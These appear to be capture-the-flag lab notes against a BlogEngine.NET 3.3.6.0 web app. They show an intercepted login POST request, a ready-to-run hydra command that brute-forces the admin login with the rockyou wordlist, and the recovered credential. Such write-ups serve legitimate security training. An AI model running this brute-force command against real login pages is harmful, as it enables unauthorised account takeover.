## port 80

![[Pasted image 20210527180435.png]]

## brute force attack

intersecpting the post request 

![[Pasted image 20210527182226.png]]


```
__VIEWSTATE=1jT%2FeKIquWyJY0kSi8eRWohPxvCGdIIZV74C%2BT%2FZf%2Fb94iWqLDuDKsAtaU2zqX2ysa3nlvkLNu5CyGGAPm2PrKhw8v5yl2lA341dkBu6H71fKkVzJ8%2FF%2Fyd4yBPApWjOgRWMPCdeFcpAgpSKjjJ%2BEIVAL%2BMA%2Bd7gLa5hAI2iI1YpPSmwsjbk9LKSdnHMNek1VcNk4%2B2vuhswUwqhJGDcpg657X27UE0QPvhqFh7fjdmblWSCjMQWlCc0Hr7ijgm7UaflAa4Z91EiFcr%2B6ZdXfOQLMsUqjXihripRyLnT6TANeBnInJOGL%2BGffW6cydxDv76xll19RWNGx9qLY%2FPCUZZGTwr1rdBjAtHY5QSRy%2BVeL5hy&__EVENTVALIDATION=pWIL9Mp6tOVGVfPCpIjlfvYXtZFShT9iBDKzsaWtjZY9tSRTTIiphJpDTaqXM5Fak4fRWpsH9qIjGI4hrr42hGkPMJ%2BDK%2BUprfMQc6byfqWjLH428ei9KNuD%2FoxibJwoLskM4RdCwU96Mka6jG7rTUBiwpTHXVOxeMgH5a7dgek%2FjIGM&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=pass&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

so for hydra 


```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.201.122 http-post-form "/Account/login.aspx:__VIEWSTATE=1jT%2FeKIquWyJY0kSi8eRWohPxvCGdIIZV74C%2BT%2FZf%2Fb94iWqLDuDKsAtaU2zqX2ysa3nlvkLNu5CyGGAPm2PrKhw8v5yl2lA341dkBu6H71fKkVzJ8%2FF%2Fyd4yBPApWjOgRWMPCdeFcpAgpSKjjJ%2BEIVAL%2BMA%2Bd7gLa5hAI2iI1YpPSmwsjbk9LKSdnHMNek1VcNk4%2B2vuhswUwqhJGDcpg657X27UE0QPvhqFh7fjdmblWSCjMQWlCc0Hr7ijgm7UaflAa4Z91EiFcr%2B6ZdXfOQLMsUqjXihripRyLnT6TANeBnInJOGL%2BGffW6cydxDv76xll19RWNGx9qLY%2FPCUZZGTwr1rdBjAtHY5QSRy%2BVeL5hy&__EVENTVALIDATION=pWIL9Mp6tOVGVfPCpIjlfvYXtZFShT9iBDKzsaWtjZY9tSRTTIiphJpDTaqXM5Fak4fRWpsH9qIjGI4hrr42hGkPMJ%2BDK%2BUprfMQc6byfqWjLH428ei9KNuD%2FoxibJwoLskM4RdCwU96Mka6jG7rTUBiwpTHXVOxeMgH5a7dgek%2FjIGM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

```
[STATUS] 736.00 tries/min, 736 tries in 00:01h, 14343662 to do in 324:49h, 16 active
[80][http-post-form] host: 10.10.201.122   login: admin   password: 1qaz2wsx
```

![[Pasted image 20210527184609.png]]

BlogEngine.NET

Version: 3.3.6.0 



